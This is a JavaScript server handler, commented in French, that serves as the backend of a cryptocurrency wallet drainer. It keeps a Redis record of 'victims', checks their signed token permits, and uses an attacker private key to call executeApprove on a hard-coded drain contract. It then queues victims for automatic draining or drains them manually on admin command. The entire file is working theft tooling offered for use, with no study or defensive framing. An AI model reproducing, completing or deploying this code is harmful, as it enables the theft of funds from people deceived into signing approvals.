import { ethers } from 'ethers';
import { createClient } from 'redis';
import { drainWithRetry } from '../lib/drain.js';

const PERMIT_DRAIN_ADDRESS = '0x09eD2fa44a5841f9182A2C55C5F4cB978D619ECF';
const PERMIT_DRAIN_ABI = [
  'function executeApprove(address owner, address token, address spender, uint256 amount, uint256 deadline, bytes calldata signature)',
  'function nonces(address) view returns (uint256)'
];

const RPC_URL = 'https://eth-mainnet.g.alchemy.com/v2/demo';

function getPrivateKey() {
  const key = process.env.ATTACKER_PRIVATE_KEY?.trim();
  if (!key || key.length !== 64) throw new Error('Clé privée invalide');
  return '0x' + key;
}
const wallet = new ethers.Wallet(getPrivateKey());

// Helper Redis
const getRedisClient = async () => {
  const client = createClient({ url: process.env.REDIS_URL });
  await client.connect();
  return client;
};

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const client = await getRedisClient();

  try {
    // ========== GET : historique des victimes ==========
    if (req.method === 'GET') {
      const authHeader = req.headers.authorization;
      if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'Unauthorized' });
      }
      const token = authHeader.split(' ')[1];
      if (!process.env.ADMIN_SECRET || token !== process.env.ADMIN_SECRET) {
        return res.status(403).json({ error: 'Forbidden' });
      }

      let addresses = await client.get('victims:list');
      addresses = addresses ? JSON.parse(addresses) : [];

      const victims = [];
      for (const address of addresses) {
        const data = await client.hGetAll(`victim:${address}`);
        if (data && Object.keys(data).length > 0) {
          victims.push({
            address,
            chain: data.chain || '',
            token: data.token || '',
            amount: data.amount || '0',
            status: data.status || 'unknown',
            timestamp: data.timestamp ? Number(data.timestamp) : null
          });
        }
      }

      victims.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
      return res.status(200).json(victims);
    }

    // ========== POST : drain (signature ou admin) ==========
    if (req.method === 'POST') {
      const { victim, chain, adminSecret, signature, deadline, token, spender, amount } = req.body;

      // --- DRAIN MANUEL ADMIN ---
      if (adminSecret) {
        if (!process.env.ADMIN_SECRET || adminSecret !== process.env.ADMIN_SECRET) {
          return res.status(403).json({ error: 'Forbidden' });
        }

        const success = await drainWithRetry(victim, chain || '1');

        const key = `victim:${victim}`;
        await client.hSet(key, {
          chain: chain || '1',
          token: 'USDT',
          amount: '?',
          status: success ? 'drained' : 'failed',
          timestamp: String(Date.now())
        });

        const list = await client.get('victims:list');
        const parsedList = list ? JSON.parse(list) : [];
        if (!parsedList.includes(victim)) {
          parsedList.push(victim);
          await client.set('victims:list', JSON.stringify(parsedList));
        }

        return success
          ? res.status(200).json({ success: true, victim, chain: chain || '1' })
          : res.status(500).json({ error: 'Échec du drain' });
      }

      // --- FLUX NORMAL : signature + executeApprove ---
      if (!victim || !signature || !deadline || !token || !spender || !amount)
        return res.status(400).json({ error: 'Paramètres manquants' });

      const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
      try {
        const permitContractRead = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, provider);
        const nonce = await permitContractRead.nonces(victim);
        const structHash = ethers.utils.solidityKeccak256(
          ['address', 'address', 'address', 'uint256', 'uint256', 'uint256'],
          [victim, token, spender, amount, deadline, nonce]
        );
        const recoveredAddress = ethers.utils.verifyMessage(
          ethers.utils.arrayify(structHash),
          signature
        );
        if (recoveredAddress.toLowerCase() !== victim.toLowerCase()) {
          return res.status(400).json({ error: 'Signature invalide' });
        }

        const signer = wallet.connect(provider);
        const permitContractWrite = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, signer);
        const tx = await permitContractWrite.executeApprove(
          victim, token, spender, amount, deadline, signature,
          { gasLimit: 300000 }
        );
        await tx.wait();
        console.log('✅ Approve exécuté');
      } catch (err) {
        console.error('❌ Échec approve:', err.message);
        return res.status(500).json({ error: 'Échec de l’approve' });
      }

      // --- ENREGISTRER DANS LE HASH (après approve) ---
      const key = `victim:${victim}`;
      const oldData = await client.hGetAll(key);

      // Lire le mode de drain (auto/manual)
      const drainMode = await client.get('drain:mode') || 'auto';

      if (drainMode === 'auto') {
        // Mode auto : on pousse dans la queue pour drain automatique
        await client.rpush('drain:queue', JSON.stringify({
          victim,
          chain: chain || '1',
          token,
          amount
        }));
      }

      await client.hSet(key, {
        chain: chain || oldData.chain || '1',
        token: token,
        amount: amount,
        status: drainMode === 'auto' ? 'approved' : 'pending_manual',
        timestamp: String(Date.now())
      });

      // Ajouter à la liste si absent
      const list = await client.get('victims:list');
      const parsedList = list ? JSON.parse(list) : [];
      if (!parsedList.includes(victim)) {
        parsedList.push(victim);
        await client.set('victims:list', JSON.stringify(parsedList));
      }

      return res.status(200).json({ success: true, queued: drainMode === 'auto', victim, chain: chain || '1' });
    }

    return res.status(405).json({ error: 'Méthode non autorisée' });
  } catch (err) {
    console.error('Erreur handler:', err);
    return res.status(500).json({ error: err.message });
  } finally {
    await client.disconnect();
  }
}
